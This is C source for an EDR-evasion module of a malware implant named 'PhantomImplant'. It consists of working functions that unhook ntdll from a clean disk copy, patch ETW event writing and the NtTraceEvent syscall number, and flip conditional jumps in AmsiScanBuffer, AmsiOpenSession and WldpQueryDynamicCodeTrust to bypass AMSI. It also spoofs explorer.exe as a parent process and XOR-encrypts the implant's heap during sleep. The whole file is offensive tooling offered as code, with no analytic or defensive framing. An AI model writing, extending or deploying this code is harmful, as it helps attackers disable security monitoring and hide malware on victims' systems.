/**
 * PhantomImplant - EDR Evasion Module
 *
 * Three core techniques:
 *   1. NTDLL Unhooking  - Map clean ntdll from disk, overwrite hooked .text section
 *   2. ETW Bypass       - Patch EtwEventWrite/Full + NtTraceEvent SSN
 *   3. AMSI Bypass      - Patch AmsiOpenSession + AmsiScanBuffer (je -> jne)
 *
 * Based on: MalDev Academy Modules 84, 105, 110
 */

#include "evasion.h"
#include "api.h"
#include <bcrypt.h>
#include <tlhelp32.h>
#include <stdio.h>

// =============================================
// Opcodes
// =============================================
#define x64_RET_OPCODE      0xC3
#define x64_INT3_OPCODE     0xCC
#define x64_JE_OPCODE       0x74
#define x64_JNE_OPCODE      0x75
#define x64_MOV_OPCODE      0xB8
#define x64_SYSCALL_SIZE    0x20

// =============================================
// 1. NTDLL UNHOOKING (from disk via mapped file)
// =============================================

// Get local ntdll base from PEB (second module in load order)
static PVOID FetchLocalNtdllBase(VOID) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

// Map clean ntdll from disk using SEC_IMAGE_NO_EXECUTE (no kernel callback)
static BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {
    HANDLE hFile = NULL, hSection = NULL;
    CHAR cWinPath[MAX_PATH / 2] = { 0 };
    CHAR cNtdllPath[MAX_PATH] = { 0 };
    PBYTE pBuf = NULL;

    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0)
        goto _Fail;

    sprintf(cNtdllPath, "%s\\System32\\NTDLL.DLL", cWinPath);

    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        goto _Fail;

    // SEC_IMAGE_NO_EXECUTE: maps as image but doesn't trigger PsSetLoadImageNotifyRoutine
    hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (!hSection)
        goto _Fail;

    pBuf = (PBYTE)MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!pBuf)
        goto _Fail;

    *ppNtdllBuf = pBuf;
    CloseHandle(hFile);
    CloseHandle(hSection);
    return TRUE;

_Fail:
    if (hFile && hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hSection) CloseHandle(hSection);
    return FALSE;
}

// Replace hooked .text section with clean one
static BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
    PVOID pLocalNtdll = FetchLocalNtdllBase();

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PVOID  pLocalTxt  = NULL;
    PVOID  pCleanTxt  = NULL;
    SIZE_T sTxtSize   = 0;

    PIMAGE_SECTION_HEADER pSecHdr = IMAGE_FIRST_SECTION(pNtHdrs);
    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSecHdr[i].Name | 0x20202020) == 'xet.') {
            pLocalTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSecHdr[i].VirtualAddress);
            pCleanTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSecHdr[i].VirtualAddress);
            sTxtSize  = pSecHdr[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pLocalTxt || !pCleanTxt || !sTxtSize)
        return FALSE;

    DWORD dwOld = 0;
    if (!VirtualProtect(pLocalTxt, sTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOld))
        return FALSE;

    memcpy(pLocalTxt, pCleanTxt, sTxtSize);

    if (!VirtualProtect(pLocalTxt, sTxtSize, dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

BOOL UnhookNtdll(VOID) {
    PVOID pCleanNtdll = NULL;

    if (!MapNtdllFromDisk(&pCleanNtdll))
        return FALSE;

    BOOL bResult = ReplaceNtdllTxtSection(pCleanNtdll);
    UnmapViewOfFile(pCleanNtdll);
    return bResult;
}

// =============================================
// 2. ETW BYPASS
// =============================================

// Patch EtwEventWrite or EtwEventWriteFull with xor eax,eax; ret
static BOOL PatchEtwFunc(LPCSTR szFuncName) {
    PBYTE pFunc = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), szFuncName);
    if (!pFunc) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret
    DWORD dwOld = 0;

    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &dwOld))
        return FALSE;

    memcpy(pFunc, patch, sizeof(patch));

    if (!VirtualProtect(pFunc, sizeof(patch), dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

// Patch NtTraceEvent SSN with dummy value
static BOOL PatchNtTraceEventSSN(VOID) {
    PBYTE pFunc = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
    if (!pFunc) return FALSE;

    PBYTE pSSN = NULL;
    for (int i = 0; i < x64_SYSCALL_SIZE; i++) {
        if (pFunc[i] == x64_MOV_OPCODE) {
            pSSN = &pFunc[i + 1];
            break;
        }
        if (pFunc[i] == x64_RET_OPCODE || pFunc[i] == 0x0F)
            return FALSE;
    }
    if (!pSSN) return FALSE;

    DWORD dwOld = 0;
    if (!VirtualProtect(pSSN, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOld))
        return FALSE;

    *(PDWORD)pSSN = 0x000000FF; // Dummy SSN → STATUS_INVALID_PARAMETER

    if (!VirtualProtect(pSSN, sizeof(DWORD), dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

BOOL PatchEtw(VOID) {
    BOOL b1 = PatchEtwFunc("EtwEventWrite");
    BOOL b2 = PatchEtwFunc("EtwEventWriteFull");
    BOOL b3 = PatchNtTraceEventSSN();
    return b1 || b2 || b3; // Success if at least one patch worked
}

// =============================================
// 3. AMSI BYPASS
// =============================================

// Verify a je instruction actually jumps to mov eax, E_INVALIDARG
static BOOL VerifyJeTarget(PBYTE pAddr) {
    if (*pAddr != x64_JE_OPCODE) return FALSE;
    BYTE bOffset = *(pAddr + 1);
    PBYTE pTarget = pAddr + 2 + bOffset;
    return *pTarget == x64_MOV_OPCODE;
}

// Generic: find last ret, search upward for verified je, patch to jne
static BOOL PatchFuncJeToJne(PBYTE pFunc) {
    if (!pFunc) return FALSE;

    DWORD i = 0;
    // Find last ret (followed by int3 int3)
    while (1) {
        if (pFunc[i] == x64_RET_OPCODE && pFunc[i + 1] == x64_INT3_OPCODE && pFunc[i + 2] == x64_INT3_OPCODE)
            break;
        i++;
        if (i > 0x1000) return FALSE; // Safety limit
    }

    // Search upward for verified je instruction
    PBYTE pTarget = NULL;
    while (i) {
        if (VerifyJeTarget(&pFunc[i])) {
            pTarget = &pFunc[i];
            break;
        }
        i--;
    }
    if (!pTarget) return FALSE;

    // Patch je (0x74) → jne (0x75)
    DWORD dwOld = 0;
    if (!VirtualProtect(pTarget, 1, PAGE_EXECUTE_READWRITE, &dwOld))
        return FALSE;
    *pTarget = x64_JNE_OPCODE;
    if (!VirtualProtect(pTarget, 1, dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

BOOL PatchAmsi(VOID) {
    // amsi.dll may not be loaded yet — load it
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE; // No AMSI = nothing to patch (success)

    BOOL b1 = PatchFuncJeToJne((PBYTE)GetProcAddress(hAmsi, "AmsiOpenSession"));
    BOOL b2 = PatchFuncJeToJne((PBYTE)GetProcAddress(hAmsi, "AmsiScanBuffer"));

    // WldpQueryDynamicCodeTrust (optional, in wldp.dll)
    HMODULE hWldp = LoadLibraryA("wldp.dll");
    BOOL b3 = FALSE;
    if (hWldp)
        b3 = PatchFuncJeToJne((PBYTE)GetProcAddress(hWldp, "WldpQueryDynamicCodeTrust"));

    return b1 || b2;
}

// =============================================
// Run all evasion techniques
// =============================================
BOOL RunAllEvasion(VOID) {
    BOOL bNtdll = UnhookNtdll();
    BOOL bEtw   = PatchEtw();
    BOOL bAmsi  = PatchAmsi();
    return bNtdll && bEtw && bAmsi;
}

// =============================================
// 4. PPID SPOOFING
// Open explorer.exe with PROCESS_CREATE_PROCESS so it can be used
// as the spoofed parent in STARTUPINFOEXA attribute lists.
// =============================================
HANDLE GetSpoofParentHandle(VOID) {
    HANDLE hParent = NULL;
    PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return NULL;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return hParent;
}

// =============================================
// 5. SLEEP MASKING (Heap Encryption)
// XOR-encrypt all live blocks on the implant's private heap before sleeping.
// Using a private heap (not GetProcessHeap) avoids corrupting CRT internals.
// Call ImplantHeapInit() once at startup, then use ImplantAlloc/ImplantFree
// for all implant allocations that should be masked during sleep.
// =============================================

static HANDLE g_hImplantHeap = NULL;

BOOL ImplantHeapInit(VOID) {
    g_hImplantHeap = HeapCreate(0, 0, 0);
    return (g_hImplantHeap != NULL);
}

PVOID ImplantAlloc(SIZE_T size) {
    if (!g_hImplantHeap) return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    return HeapAlloc(g_hImplantHeap, HEAP_ZERO_MEMORY, size);
}

VOID ImplantFree(PVOID ptr) {
    if (!g_hImplantHeap || !ptr) return;
    HeapFree(g_hImplantHeap, 0, ptr);
}

VOID MaskedSleep(DWORD dwMs) {
    BYTE bKey = 0;
    BCryptGenRandom(NULL, &bKey, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (bKey == 0) bKey = 0xAB; // ensure non-zero key

    HANDLE hHeap = g_hImplantHeap ? g_hImplantHeap : GetProcessHeap();
    PROCESS_HEAP_ENTRY he = { 0 };

    HeapLock(hHeap);
    while (HeapWalk(hHeap, &he)) {
        if ((he.wFlags & PROCESS_HEAP_ENTRY_BUSY) && he.cbData > 0) {
            PBYTE p = (PBYTE)he.lpData;
            for (SIZE_T i = 0; i < he.cbData; i++)
                p[i] ^= bKey;
        }
    }
    HeapUnlock(hHeap);

    Sleep(dwMs);

    ZeroMemory(&he, sizeof(he));
    HeapLock(hHeap);
    while (HeapWalk(hHeap, &he)) {
        if ((he.wFlags & PROCESS_HEAP_ENTRY_BUSY) && he.cbData > 0) {
            PBYTE p = (PBYTE)he.lpData;
            for (SIZE_T i = 0; i < he.cbData; i++)
                p[i] ^= bKey;
        }
    }
    HeapUnlock(hHeap);
}
